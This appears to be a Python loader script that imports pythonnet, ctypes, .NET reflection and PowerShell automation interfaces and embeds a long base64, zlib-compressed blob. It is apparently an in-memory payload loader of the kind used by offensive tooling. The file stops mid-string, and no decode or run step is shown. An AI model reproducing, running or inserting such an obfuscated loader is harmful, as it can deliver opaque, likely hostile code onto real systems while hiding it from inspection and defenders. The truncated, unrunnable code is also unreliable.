import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly
import System.Reflection as Reflection

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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